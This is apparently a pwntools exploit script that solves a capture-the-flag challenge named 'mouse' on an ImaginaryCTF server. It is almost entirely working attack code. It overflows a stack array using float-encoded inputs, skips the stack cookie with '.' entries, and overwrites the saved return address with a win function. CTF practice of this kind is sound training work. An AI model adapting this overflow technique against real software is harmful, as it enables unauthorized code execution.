from pwn import *

def overflow():
    for i in range(0,22):
        if(i == 16):                                                # current i value of the for loop
            r.sendlineafter('favorite number? ', '2.24207754e-44')  # value = 16
        elif(i == 17):                                              # for max i value 
            r.sendlineafter('favorite number? ', '3.36311631e-44')  # value = 24
        elif(i == 18):                                              # for bypassing stack cookie :)
            r.sendlineafter('favorite number? ','.')
        elif(i == 19):
            r.sendlineafter('favorite number? ','.')
        else:                                                       # fill remaining places with 0
            r.sendlineafter('favorite number? ','0')

r = remote("puzzler7.imaginaryctf.org" ,4004)
#r = process("./mouse")
e = ELF("./mouse")
r.sendlineafter('How many favorite numbers do you have?','24')
r.recv()
overflow()
r.sendlineafter('favorite number? ','5.88377479e-39')               # value of win function is passed to saved ret pointer+0
r.sendlineafter('favorite number? ','0')                            # for saved ret pointer+4
r.recv()
r.interactive()
